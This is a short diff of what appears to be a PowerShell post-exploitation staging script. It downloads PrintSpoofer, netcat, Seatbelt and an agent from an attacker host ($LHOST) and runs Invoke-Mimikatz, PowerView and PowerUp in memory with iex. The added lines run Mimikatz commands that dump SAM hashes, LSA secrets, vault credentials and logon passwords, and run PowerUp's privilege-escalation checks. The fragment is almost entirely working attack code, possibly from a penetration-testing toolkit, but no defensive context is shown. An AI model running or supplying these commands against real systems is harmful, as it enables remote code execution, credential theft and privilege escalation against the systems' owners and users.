@@ -50,10 +50,13 @@ if ($LHOST){
     wget -usebasicparsing http://$LHOST/PrintSpoofer64.exe -o PrintSpoofer.exe
     wget -usebasicparsing http://$LHOST/nc64.exe -o nc64.exe
     wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
+    wget -usebasicparsing http://$LHOST/Seatbelt.exe -o Seatbelt.exe
     iex (iwr -usebasicparsing http://$LHOST/Invoke-Mimikatz.ps1)
+    invoke-mimikatz -command '"token::elevate" "lsadump::lsa /patch" "vault::cred /patch" "lsadump::secrets" "lsadump::sam" "sekurlsa::logonPasswords full"'
     iex (iwr -usebasicparsing http://$LHOST/PowerView.ps1)
     iex (iwr -usebasicparsing http://$LHOST/PowerView-Dev.ps1)
     iex (iwr -usebasicparsing http://$LHOST/PowerUp.ps1)
+    invoke-allchecks
     }
 
 }
